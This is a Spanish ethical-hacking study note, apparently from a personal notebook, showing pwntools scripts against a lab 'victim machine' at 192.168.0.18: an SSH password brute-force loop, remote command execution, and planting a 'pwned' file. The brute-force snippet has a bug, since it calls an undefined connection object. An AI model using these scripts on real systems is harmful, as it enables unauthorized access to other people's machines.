#PWN #HackingPython #PinguinoMario #HackingEtico
Para comprobar que existe conectividad por ssh, para ello ejecutamos este código con una máquina víctima:
```python
from pwn import *

user = 'mario'
host = '192.168.0.18'
password = '123123'

ssh_conn = ssh(user, host, password=password)
```
Y veremos que con estos datos es correcto y hay conectividad:
![[Pasted image 20230417133513.png]]
## ATAQUE FUERZA BRUTA CONTRASEÑAS SSH PWN
Podemos probar varias combinaciones de contraseñas con la librería pwn de esta forma.
```python
from pwn import *

posibles_passwords = ['mario123', 'pass123', 'password1', '123123']

user = 'mario'
host = '192.168.0.18'

for i in posibles_passwords:
    try:
        ssh_connection = ssh(user, host, password=i)
        print(f"LA CONTRASEÑA ES {i}")
    except:
        pass

ssh_conn('whoami') # Ejecutamos un comando con espacios.
```
Y aquí vemos el resultado y cómo la contraseña correcta es la de 123123:
![[Pasted image 20230417151130.png]]
## EJECUTAR COMANDOS SSH PWN
Y ahora podemos entrar por ssh y ejecutar comandos remotamente poniendo este código:
```python
from pwn import *

user = 'mario'
host = '192.168.0.18'
password = '123123'

ssh_conn = ssh(user, host, password=password)

ssh_conn.whoami() # Ejecutamos un comando.
```
Y vemos que el comando se ejecuta correctamente:
![[Pasted image 20230417133637.png]]
Pero si queremos ejecutar un comando con espacios, lo haríamos de esta forma:
```python
from pwn import *

user = 'mario'
host = '192.168.0.18'
password = '123123'

ssh_conn = ssh(user, host, password=password)

ssh_conn('ls -la') # Ejecutamos un comando con espacios.
```
Y vemos el resultado:
![[Pasted image 20230417133859.png]]
## CAMBIAR DE DIRECTORIO DE TRABAJO SSH PWN
Si queremos que se cambie el actual directorio de trabajo de la máquina víctima lo haremos con el parámetro set_working_directory:
```python
from pwn import *

user = 'mario'
host = '192.168.0.18'
password = '123123'

ssh_conn = ssh(user, host, password=password)

# Cambiar el directorio de trabajo en el servidor remoto
ssh_conn.set_working_directory('/home/mario/Escritorio')
ssh_conn('touch pwned')
```
Y ahora vemos como se ha creado un nuevo archivo dentro del escritorio de la máquina víctima:
![[Pasted image 20230417134255.png]]

